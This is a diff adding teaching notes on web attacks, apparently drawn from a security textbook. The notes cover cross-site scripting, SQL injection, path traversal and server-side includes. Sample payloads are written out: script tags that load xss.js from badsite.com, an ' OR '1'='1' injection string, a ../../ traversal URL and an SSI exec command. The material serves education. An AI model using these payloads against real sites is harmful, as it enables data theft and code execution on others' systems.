@@ -279,3 +279,80 @@
 * The other control is a responsibility of the web page owner: Ensure that code on a web page is good, clean, or
   suitable. Here again, the likelihood of that happening is small, for two reasons.
 * Second, good (secure, safe) code is hard to define and enforce.
+
+## Google's "site:" search operator
+
+* Using Google’s “site:” search operator, you can specify that it should return only pages from the site you specify.
+* If you don’t give any search terms at all, apart from the site, you should get a list of all pages indexed in Google (
+  e.g. “site:york.ac.uk” should list all pages visible under the University’s domain).
+
+# Other web flaws
+
+* Someone interested in obtaining unauthorized data from the background database server crafts and passes SQL commands
+  to the server through the web interface.
+* Similar attacks involve writing scripts in Java. These attacks are called scripting or injection attacks because the
+  unauthorized request is delivered as a script or injected into the dialog with the server.
+
+## Cross-Site Scripting
+
+* Scripting attack: forcing the server to execute commands (a script) in a normal data fetch request
+* To a user (client) it seems as if interaction with a server is a direct link, so it is easy to ignore the possibility
+  of falsification along the way. However, many web interactions involve several parties, not just the simple case of
+  one client to one server.
+* In an attack called cross-site scripting, executable code is included in the interaction between client and server and
+  executed by the client or server.
+
+* For Example :
+    * http://www.google.com/search?name=<SCRIPT
+      SRC=http://badsite.com/xss.js></SCRIPT>&q=cross+site+scripting&ie=utf-8&oe=utf-8 &aq=t&rls=org.mozilla:en-US:
+      official &client=firefox-a&lr=lang_en
+    * This string would connect to badsite.com where it would execute the Java script xss that could do anything allowed
+      by the user’s security context.
+
+* Sometimes a volley from the client will contain a script for the server to execute. The attack can also harm the
+  server side if the server interprets and executes the script or saves the script and returns it to other clients (who
+  would then execute the script).
+    * Such behavior is called a persistent cross-site scripting attack.
+
+* A malicious user could post a comment with embedded HTML containing a script, such as but their browser would execute
+  the malicious script.
+    * For example : Cool<br>story.<br>KCTVBigFan<script src=http://badsite.com/xss.js></script>
+
+## SQL Injection
+
+* SQL injection operates by inserting code into an exchange between a client and database server.
+* To understand this attack, you need to know that database management systems (DBMSs) use a language called SQL (which,
+  in this context, stands for structured query language) to represent queries to the DBMS.
+* If the user can inject a string into this interchange, the user can force the DBMS to return a set of records. The
+  DBMS evaluates the WHERE clause as a logical expression.
+    * For Example:  QUERY = “SELECT * FROM trans WHERE acct=’”+ acctNum + ”’;”
+    * If the user enters the account number as “‘2468’ OR ‘1’=‘1’” the resulting query becomes
+    * QUERY = “SELECT * FROM trans WHERE acct=‘2468’ OR ‘1’=‘1’”
+* Because ‘1’=‘1’ is always TRUE, the OR of the two parts of the WHERE clause is always TRUE, every record satisfies the
+  value of the WHERE clause and so the DBMS will return all records in the database.
+* The trick here, as with cross-site scripting, is that the browser application includes direct user input into the
+  command, and the user can force the server to execute arbitrary SQL commands.
+
+## Dot-Dot-Slash
+
+* Enter the dot-dot. In both Unix and Windows, ‘..’ is the directory indicator for “predecessor.”
+    * And ‘../..’ is the grandparent of the current location. So someone who can enter file names can travel back up the
+      directory tree one .. at a time.
+
+* For example, passing the following URL causes the server to return the requested file, autoexec.nt, enabling an
+  attacker to modify or delete it.
+    * http://yoursite.com/webhits.htw?CiWebHits &File=../../../../../winnt/system32/autoexec.nt
+
+## Server-Side Include
+
+* A potentially more serious problem is called a server-side include.
+* The problem takes advantage of the fact that web pages can be organized to invoke a particular function automatically.
+    * For example, many pages use web commands to send an email message in the “contact us” part of the displayed page.
+    * The commands are placed in a field that is interpreted in HTML.
+
+* One of the server-side include commands is exec, to execute an arbitrary file on the server. For instance, the
+  server-side include command
+    * <!—#exec cmd=”/usr/bin/telnet &”—>
+* opens a Telnet session from the server running in the name of (that is, with the privileges of) the server.
+* An attacker may find it interesting to execute commands such as chmod (change access rights to an object), sh (
+  establish a command shell), or cat (copy to a file).    
